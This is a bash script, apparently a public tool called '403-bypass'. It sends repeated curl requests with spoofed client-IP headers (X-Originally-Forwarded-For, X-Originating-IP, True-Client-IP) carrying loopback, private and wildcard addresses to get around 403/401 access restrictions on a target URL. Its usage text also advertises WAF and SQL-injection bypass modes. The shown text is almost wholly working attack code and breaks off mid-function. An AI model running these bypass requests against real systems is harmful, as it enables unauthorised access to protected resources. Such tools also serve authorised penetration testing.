#!/bin/bash
#color
red='\e[31m'
green='\e[32m'
blue='\e[34m'
cyan='\e[96m'
ltcyan='\e[96m'
yellow='\e[33m'
black='\e[38;5;016m'
bluebg='\e[48;5;038m'${black}
end='\e[0m'
termwidth="$(tput cols)"
function print(){
	status=$(echo ${code} | awk '{print $2}'|sed 's/,$//g')
	if [[ ${status} =~ 2.. ]];then
			printf "${green} ${code} ${end} 👌\n${payload}\n"
	elif [[ ${status} =~ 3.. ]]; then
			printf "${yellow} ${code} ${end}\n"
	elif [[ ${status} =~ 5.. ]]; then
			printf "${ltcyan} ${code} ${end}\n"
	else
			printf "${red} ${code} ${end}\n"
	fi
}
function banner(){
	echo "💀💀💀💀💀💀💀💀💀"
	echo -e "💀$green Have a beer🍺💀 $end"
	echo "💀💀💀💀💀💀💀💀💀"
	echo -e "     ${cyan}- twitter.com/Dheerajmadhukar : @me_dheeraj${end}"
}
function usage(){
        printf "Usage:\n"
        printf "\t403-bypass [URL]\n">&2
        printf '\n' >&2
        printf "\t-u, --url URL\t\t\ttarget DOMAIN.TLD/PATH\n">&2
		printf '\n' >&2
		printf "BYPASS MODEs\n">&2
		printf "\t--header\t\t\tHeader Bypass\n">&2
		printf "\t--protocol\t\t\tProtocol Bypass\n">&2
		printf "\t--port\t\t\t\tPort Bypass\n">&2
		printf "\t--HTTPmethod\t\t\tHTTP Method Bypass\n">&2
		printf "\t--encode\t\t\tURL Encode Bypass\n">&2
		printf "\t--SQLi\t\t\t\tMod_Security & libinjection Bypass\n">&2
		printf '\n' >&2
		printf "ALL BYPASSES\n">&2
		printf "\t--exploit\t\t\tComplete Scan: 403/401 bypass modes \n">&2
		printf '\n' >&2
		printf "\t${green}GREEN${end}\t:\t${green}2xx Status Code${end}\n">&2
		printf "\t${yellow}YELLOW${end}\t:\t${yellow}3xx Status Code${end}\n">&2
		printf "\t${red}RED${end}\t:\t${red}4xx Status Code${end}\n">&2
		printf "\t${ltcyan}BLUE${end}\t:\t${ltcyan}5xx Status Code${end}\n">&2
}
function Header_Bypass(){
	echo -e ${blue}"----------------------"${end}
	echo -e ${cyan}"[+] HTTP Header Bypass"${end}
	echo -e ${blue}"----------------------"${end}
		
	echo -n "X-Originally-Forwarded-For Payload: ${website_ip}"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Originally-Forwarded-For: ${website_ip}, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Originally-Forwarded-For: ${website_ip}, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Originally-Forwarded-For Payload: 127.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Originally-Forwarded-For: 127.0.0.1, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Originally-Forwarded-For: 127.0.0.1, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Originally-Forwarded-For Payload: *"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Originally-Forwarded-For: *, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Originally-Forwarded-For: *, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Originally-Forwarded-For Payload: 8.8.8.8"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Originally-Forwarded-For: 8.8.8.8, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Originally-Forwarded-For: 8.8.8.8, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Originally-Forwarded-For Payload: null"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Originally-Forwarded-For: null, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Originally-Forwarded-For: null, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Originally-Forwarded-For Payload: 192.168.0.2"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Originally-Forwarded-For: 192.168.0.2, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Originally-Forwarded-For: 192.168.0.2, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Originally-Forwarded-For Payload: 10.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Originally-Forwarded-For: 10.0.0.1, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Originally-Forwarded-For: 10.0.0.1, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Originally-Forwarded-For Payload: 0.0.0.0"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Originally-Forwarded-For: 0.0.0.0, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Originally-Forwarded-For: 0.0.0.0, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Originally-Forwarded-For Payload: localhost"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Originally-Forwarded-For: localhost, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Originally-Forwarded-For: localhost, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Originally-Forwarded-For Payload: 192.168.1.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Originally-Forwarded-For: 192.168.1.1, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Originally-Forwarded-For: 192.168.1.1, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	
	echo -n "X-Originating-  Payload: ${website_ip}"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Originating-: ${website_ip}, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Originating-: ${website_ip}, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Originating-  Payload: 127.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Originating-: 127.0.0.1, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Originating-: 127.0.0.1, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Originating-  Payload: *"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Originating-: *, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Originating-: *, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Originating-  Payload: 8.8.8.8"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Originating-: 8.8.8.8, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Originating-: 8.8.8.8, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Originating-  Payload: null"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Originating-: null, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Originating-: null, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Originating-  Payload: 192.168.0.2"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Originating-: 192.168.0.2, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Originating-: 192.168.0.2, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Originating-  Payload: 10.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Originating-: 10.0.0.1, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Originating-: 10.0.0.1, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Originating-  Payload: 0.0.0.0"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Originating-: 0.0.0.0, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Originating-: 0.0.0.0, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Originating-  Payload: localhost"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Originating-: localhost, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Originating-: localhost, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Originating-  Payload: 192.168.1.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Originating-: 192.168.1.1, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Originating-: 192.168.1.1, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"


	echo -n "X-Originating-IP Payload: ${website_ip}"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Originating-IP: ${website_ip}, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Originating-IP: ${website_ip}, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Originating-IP Payload: 127.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Originating-IP: 127.0.0.1, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Originating-IP: 127.0.0.1, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Originating-IP Payload: *"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Originating-IP: *, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Originating-IP: *, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Originating-IP Payload: 8.8.8.8"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Originating-IP: 8.8.8.8, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Originating-IP: 8.8.8.8, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Originating-IP Payload: null"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Originating-IP: null, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Originating-IP: null, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Originating-IP Payload: 192.168.0.2"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Originating-IP: 192.168.0.2, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Originating-IP: 192.168.0.2, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Originating-IP Payload: 10.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Originating-IP: 10.0.0.1, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Originating-IP: 10.0.0.1, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Originating-IP Payload: 0.0.0.0"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Originating-IP: 0.0.0.0, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Originating-IP: 0.0.0.0, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Originating-IP Payload: localhost"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Originating-IP: localhost, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Originating-IP: localhost, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Originating-IP Payload: 192.168.1.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Originating-IP: 192.168.1.1, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Originating-IP: 192.168.1.1, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	
	echo -n "True-Client-IP Payload: ${website_ip}"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "True-Client-IP: ${website_ip}, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'True-Client-IP: ${website_ip}, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "True-Client-IP Payload: 127.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "True-Client-IP: 127.0.0.1, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'True-Client-IP: 127.0.0.1, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "True-Client-IP Payload: *"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "True-Client-IP: *, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'True-Client-IP: *, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "True-Client-IP Payload: 8.8.8.8"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "True-Client-IP: 8.8.8.8, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'True-Client-IP: 8.8.8.8, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
